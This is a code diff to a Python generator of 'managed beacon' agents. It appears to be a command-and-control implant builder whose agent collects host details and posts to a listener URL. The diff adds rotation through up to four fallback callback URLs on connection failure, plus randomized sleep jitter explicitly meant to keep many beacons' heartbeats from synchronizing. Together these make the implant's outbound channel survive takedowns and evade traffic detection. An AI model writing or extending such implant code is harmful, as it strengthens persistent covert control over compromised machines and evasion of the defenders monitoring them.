@@ -28,12 +28,28 @@ class ManagedBeaconBuild:
 
 _PYTHON_AGENT_CONTRACT_BODY = r"""session_key = os.environ.get('AC_SESSION_KEY', '')
 
+BASES = [BASE_URL] + [u for u in (FALLBACK_URLS or []) if u]
+_base_idx = 0
+
+def _url(path):
+    return BASES[_base_idx % len(BASES)] + path
+
 def post_json(path, payload):
+    global _base_idx
     body = json.dumps(payload, separators=(',', ':')).encode()
-    request = urllib.request.Request(BASE_URL + path, data=body, method='POST', headers=HEADERS)
-    with urllib.request.urlopen(request, timeout=30) as response:
-        raw = response.read().decode()
-    return json.loads(raw) if raw else {}
+    last_exc = None
+    for _ in range(len(BASES)):
+        request = urllib.request.Request(_url(path), data=body, method='POST', headers=HEADERS)
+        try:
+            with urllib.request.urlopen(request, timeout=30) as response:
+                raw = response.read().decode()
+            return json.loads(raw) if raw else {}
+        except urllib.error.HTTPError:
+            raise  # 401/403/404 carry caller-visible semantics — no failover
+        except Exception as exc:
+            last_exc = exc
+            _base_idx += 1  # transport failure → fail over to the next channel
+    raise last_exc
 
 def _collect_internal_ips():
     ips = []
@@ -455,7 +471,9 @@ while True:
                 pass
     except (urllib.error.URLError, TimeoutError, ValueError, OSError):
         pass
-    time.sleep(sleep_seconds)
+    # ±20% jitter: heartbeat trains from many beacons never synchronize.
+    _jitter = 1.0 + ((hash(time.time()) % 41) - 20) / 100.0
+    time.sleep(max(1, sleep_seconds * _jitter))
 """
 
 
@@ -481,6 +499,7 @@ def _render_python_agent_contract(params: dict[str, Any]) -> str:
     return (
         "import base64, csv, getpass, hashlib, json, os, platform, re, shutil, socket, subprocess, tempfile, time, urllib.error, urllib.request\n"
         f"BASE_URL = {base_url!r}\n"
+        f"FALLBACK_URLS = {params['fallbackUrls']!r}\n"
         f"SLEEP_SECONDS = {params['sleepSeconds']}\n"
         f"LISTENER_ID = {params['listenerId']}\n"
         f"REGISTRATION_TOKEN = {params['registrationToken']!r}\n"
@@ -594,6 +613,14 @@ def generate_managed_beacon(payload: dict[str, Any]) -> ManagedBeaconBuild:
             payload.get("listenerId"), default=0, minimum=0, maximum=2147483647
         ),
         "registrationToken": _clean_text(payload.get("registrationToken"), max_length=400),
+        # Optional fallback channels (full base URLs): the beacon rotates to
+        # the next one after consecutive transport failures and restores the
+        # primary on recovery — a stable channel survives single-endpoint loss.
+        "fallbackUrls": [
+            u.strip()
+            for u in (payload.get("fallbackUrls") or [])
+            if isinstance(u, str) and u.strip().startswith(("http://", "https://"))
+        ][:4],
     }
     renderers = {
         "python": _render_python_agent_contract,
